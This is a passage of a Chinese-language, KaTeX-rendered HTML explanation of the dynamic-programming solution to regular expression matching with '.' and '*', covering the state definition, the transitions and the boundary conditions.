中取出一个字符或者「字符 + 星号」的组合，并在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中进行匹配。对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 中一个字符而言，它只能在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中匹配一个字符，匹配的方法具有唯一性；而对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 中字符 + 星号的组合而言，它可以在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中匹配任意自然数个字符，并不具有唯一性。因此我们可以考虑使用动态规划，对匹配的方案进行枚举。</p><p>我们用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 的前 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个字符与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 中的前 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字符是否能够匹配。在进行状态转移时，我们考虑 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字符的匹配情况：</p><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字符是一个小写字母，那么我们必须在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中匹配一个相同的小写字母，即</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>false</mtext><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo mathvariant="normal">≠</mo><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f[i][j] = \begin{cases} f[i - 1][j - 1], &amp; s[i] = p[j]\\ \text{false}, &amp; s[i] \neq p[j] \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">false</span></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>也就是说，如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个字符与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字符不相同，那么无法进行匹配；否则我们可以匹配两个字符串的最后一个字符，完整的匹配结果取决于两个字符串前面的部分。</p><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字符是 *，那么就表示我们可以对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个字符匹配任意自然数次。在匹配 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 次的情况下，我们有</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[i][j] = f[i][j - 2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span></p><p>也就是我们「浪费」了一个字符 + 星号的组合，没有匹配任何 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中的字符。</p><p>在匹配 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mo>⋯</mo></mrow><annotation encoding="application/x-tex">1,2,3, \cdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span></span></span></span> 次的情况下，类似地我们有</p><p><img src="long.svg" alt=""></p><p>如果我们通过这种方法进行转移，那么我们就需要枚举这个组合到底匹配了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中的几个字符，会增导致时间复杂度增加，并且代码编写起来十分麻烦。我们不妨换个角度考虑这个问题：字母 + 星号的组合在匹配的过程中，本质上只会有两种情况：</p><p>匹配 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 末尾的一个字符，将该字符扔掉，而该组合还可以继续进行匹配；</p><p>不匹配字符，将该组合扔掉，不再进行匹配。</p><p>如果按照这个角度进行思考，我们可以写出很精巧的状态转移方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mtext> or </mtext><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo mathvariant="normal">≠</mo><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f[i][j] = \begin{cases} f[i - 1][j] \text{~or~} f[i][j - 2], &amp; s[i] = p[j - 1] \\ f[i][j - 2], &amp; s[i] \neq p[j - 1] \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mord text"><span class="mord nobreak"> </span><span class="mord">or</span><span class="mord nobreak"> </span></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mclose">]</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mclose">]</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>在任意情况下，只要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">p[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 是 .，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">p[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 一定成功匹配 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 中的任意一个小写字母。</p><p>最终的状态转移方程如下：</p><p><img src="long2.svg" alt=""></p><p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">matches</mtext><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\textit{matches}(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord textit">matches</span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 判断两个字符是否匹配的辅助函数。只有当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 是 . 或者 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 本身相同时，这两个字符才会匹配。</p><p><strong>细节</strong></p><p>动态规划的边界条件为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mtext>true</mtext></mrow><annotation encoding="application/x-tex">f[0][0] = \text{true}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord text"><span class="mord">true</span></span></span></span></span>，即两个空字符串是可以匹配的。最终的答案即为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[m][n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 